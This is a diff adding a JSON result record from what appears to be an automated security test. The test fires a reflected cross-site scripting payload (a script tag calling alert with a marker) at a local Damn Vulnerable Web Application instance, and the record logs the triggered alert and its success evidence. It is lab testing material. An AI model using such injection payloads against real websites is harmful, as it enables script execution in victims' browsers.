@@ -1,0 +1,21 @@
+{
+  "url": "http://127.0.0.1:9080/vulnerabilities/xss_r/?name=%3Cscript%3Ealert%28%27XSS001%27%29%3C%2Fscript%3E",
+  "expected_marker": "XSS001",
+  "dialogs": [
+    {
+      "type": "alert",
+      "message": "XSS001",
+      "url": "http://127.0.0.1:9080/vulnerabilities/xss_r/?name=%3Cscript%3Ealert%28%27XSS001%27%29%3C%2Fscript%3E"
+    }
+  ],
+  "console": [],
+  "exceptions": [],
+  "body_has_marker": false,
+  "body_excerpt": "Home\nInstructions\nSetup / Reset DB\nBrute Force\nCommand Injection\nCSRF\nFile Inclusion\nFile Upload\nInsecure CAPTCHA\nSQL Injection\nSQL Injection (Blind)\nWeak Session IDs\nXSS (DOM)\nXSS (Reflected)\nXSS (Stored)\nCSP Bypass\nJavaScript Attacks\nAuthorisation Bypass\nOpen HTTP Redirect\nCryptography\nAPI\nDVWA Security\nPHP Info\nAbout\nLogout\nVulnerability: Reflected Cross Site Scripting (XSS)\n\nWhat's your name?  \n\nHello \nMore Information\nhttps://owasp.org/www-community/attacks/xss/\nhttps://owasp.org/www-community/xss-filter-evasion-cheatsheet\nhttps://en.wikipedia.org/wiki/Cross-site_scripting\nhttps://www.cgisecurity.com/xss-faq.html\nhttps://www.scriptalert1.com/\n\n\n\nUsername: admin\nSecurity Level: Security Level: low\nLocale: en\nSQLi DB: mysql\n\nDamn Vulnerable Web Application (DVWA)",
+  "success": true,
+  "evidence": {
+    "dialog_hit": true,
+    "console_hit": false,
+    "body_hit": false
+  }
+}
